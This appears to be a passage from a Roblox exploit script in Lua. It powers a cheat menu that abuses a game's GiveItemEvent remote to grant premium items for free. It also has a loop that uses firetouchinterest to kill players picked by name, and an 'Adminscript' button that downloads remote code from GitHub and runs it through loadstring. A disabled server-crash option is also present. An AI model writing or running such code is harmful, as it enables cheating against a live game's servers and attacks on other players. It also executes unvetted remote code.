                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang14") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang13") 
                wait(0.18)
                game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang12") 
                wait(0.18)
            end
    local message = Instance.new("Message",workspace)
    message.Text = "u need 2 milhion for equip it."
    wait(4)
    message:Destroy()
        end)
        --CrashServer
        CrashServer.MouseButton1Down:connect(function()
            game.StarterGui:SetCore("SendNotification", {
                Title = "Crash Server outdated";
                Text = "due the few roblox updates and the anti cheat, the executors doesn't have power to do a good crash anymore";
                Duration = 7;
                })
        end)
    
        --Adminscript
        Adminscript.MouseButton1Down:connect(function()
            loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
        end)
    
        --BestYingSword
        BestYingSword.MouseButton1Down:connect(function()
            game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Sword", "UltraKatana")
    local message = Instance.new("Message",workspace)
    message.Text = "u need 10 milhion for equip it."
    wait(4)
    message:Destroy()
        end)
    
        --BestYangSword
        BestYangSword.MouseButton1Down:connect(function()
            game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Sword", "BlackAndWhiteWingedSword")
    local message = Instance.new("Message",workspace)
    message.Text = "u need 10 milhion for equip it."
    wait(4)
    message:Destroy()
        end)
    
        --BestYingClothe
        BestYingClothe.MouseButton1Down:connect(function()
            game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Ying26")
    local message = Instance.new("Message",workspace)
    message.Text = "u need 10 milhion for equip it."
    wait(4)
    message:Destroy()
        end)
    
        --BestYangClothe
        BestYangClothe.MouseButton1Down:connect(function()
            game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Cloth", "Yang26")
    local message = Instance.new("Message",workspace)
    message.Text = "u need 10 milhion for equip it."
    wait(4)
    message:Destroy() 
        end)
    
        --BestShurikenYing
        BestShurikenYing.MouseButton1Down:connect(function()
            game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Shuriken", "Shuriken9Ying")
    local message = Instance.new("Message",workspace)
    message.Text = "u need 1 milhion and 500 for equip it."
    wait(4)
    message:Destroy()
        end)
    
        --BestShurikenYang
        BestShurikenYang.MouseButton1Down:connect(function()
            game.ReplicatedStorage.RemoteEvent.GiveItemEvent:FireServer("Shuriken", "Shuriken9Yang")
    local message = Instance.new("Message",workspace)
    message.Text = "u need 1 milhion and 500 for equip it."
    wait(4)
    message:Destroy()
        end)
    
        --OpenKillBar
        OpenKillBar.MouseButton1Down:connect(function()
            Open = not Open
            if not Open then
                OpenKillBar.Text = '>'
                KillBar.Visible = true
                KillBar:TweenSize(UDim2.new(0,-130,0,338), 'In', "Linear", 0.25, true, nil) --Out
                wait(0.25)
                if KillBar.Size == UDim2.new(0,-130,0,338) then
                    Button.Visible = true
                    InsertTarget.Visible = true
                    NameBox.Visible = true
                    RemoveTarget.Visible = true
                    Slider.Visible = true
                    Credit.Visible = true
                end
            else
                OpenKillBar.Text = '<'
                KillBar:TweenSize(UDim2.new(0,0,0,338), 2, "Linear", 0.25, true, nil) --Out
                Button.Visible = false
                InsertTarget.Visible = false
                NameBox.Visible = false
                RemoveTarget.Visible = false
                Slider.Visible = false
                Credit.Visible = false
            end
        end)
    
        --Slider/Button
        Slider.MouseButton1Down:Connect(function()
            _G.FTI = not _G.FTI
            if _G.FTI then
                Slider.BackgroundColor3 = Color3.fromRGB(30, 109, 12)
                Button:TweenPosition(UDim2.new(0.523, 0, 0.419, 0), 2, 'Linear', 0.25, true, nil)
            else
                Slider.BackgroundColor3 = Color3.fromRGB(135, 26, 12)
                Button:TweenPosition(UDim2.new(0.162, 0, 0.419, 0), 2, 'Linear', 0.25, true, nil)
            end
            while game.RunService.RenderStepped:wait() do
                if _G.FTI then
                    for i,v in pairs(game.Players:GetChildren()) do
                        if table.find(Targets, v.Name) and v ~= game.Players.LocalPlayer then
                            spawn(function()
                                pcall(function()
                                    for i,c in pairs(v.Character:GetChildren()) do
                                        if c:IsA("BasePart") then
                                            firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Handle, c,0)
                                        end
                                    end
                                end)
                            end)
                        end
                    end
                else
                    break
                end
            end
        end)

        Button.MouseButton1Down:connect(function()
            _G.FTI = not _G.FTI
            if _G.FTI then
                Slider.BackgroundColor3 = Color3.fromRGB(30, 109, 12)
                Button:TweenPosition(UDim2.new(0.523, 0, 0.419, 0), 2, 'Linear', 0.25, true, nil)
            else
                Slider.BackgroundColor3 = Color3.fromRGB(135, 26, 12)
                Button:TweenPosition(UDim2.new(0.162, 0, 0.419, 0), 2, 'Linear', 0.25, true, nil)
            end
            while game.RunService.RenderStepped:wait() do
                if _G.FTI then
                    for i,v in pairs(game.Players:GetChildren()) do
                        if table.find(Targets, v.Name) and v ~= game.Players.LocalPlayer then
                            spawn(function()
                                pcall(function()
                                    for i,c in pairs(v.Character:GetChildren()) do
                                        if c:IsA("BasePart") then
                                        firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass('Tool').Handle, c,0)
                                        end
                                    end
                                end)
                            end)
                        end
                    end
                else
                    break
                end
            end
        end)
    
        --TargetName
        NameBox:GetPropertyChangedSignal("Text"):Connect(function()
            for i = 1, #game.Players:GetPlayers() do
                if string.lower(string.sub(game.Players:GetPlayers()[i].Name, 1, string.len(NameBox.Text))) == string.lower(NameBox.Text) then
                    Target = game.Players:GetPlayers()[i].Name
                    break
                end
            end
        end)
    
        --RemoveTarget
        RemoveTarget.MouseButton1Down:connect(function()
            TargetRemove = table.find(Targets, Target)
            table.remove(Targets, TargetRemove)
            ChatMessage2('Targets:', 162, 173, 248)
            for i,v in pairs(Targets) do
                ChatMessage2(v, 162, 173, 248)
            end
            NameBox.Text = ""
        end)
    
        --InsertTarget
        InsertTarget.MouseButton1Down:connect(function()
            if table.find(Targets, Target) or Target == game.Players.LocalPlayer.Name then
                print(Target .. ' Already in Table')
            else
                table.insert(Targets, Target)
            end
            ChatMessage2('Targets:', 162, 173, 248)
            for i,v in pairs(Targets) do
                ChatMessage2(v, 162, 173, 248)
            end
            NameBox.Text = ""
        end)
    end
    coroutine.wrap(LFKJCS_fake_script)()
    
    while true do
        wait(10)
        print("whitelisted")
    end
end)
 
Close.Name = "Close"
Close.Parent = Frame
Close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Close.Position = UDim2.new(0.945626497, 0, 0, 0)
Close.Size = UDim2.new(0, 23, 0, 33)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.fromRGB(0, 0, 0)
Close.TextSize = 14.000
Close.MouseButton1Down:connect(function()
Frame.Visible = false
end)


game.StarterGui:SetCore("ChatMakeSystemMessage", {
    Text = "Private Version\nbuild date 29/2/24:\nA0x0231456cze\n Cloud sycn:Failed\n script build V 3.6";
    Color = Color3.fromRGB(101,14,232);
    Font = Enum.Font.SourceSansBold;
    FontSize = Enum.FontSize.Size96;
})
wait()
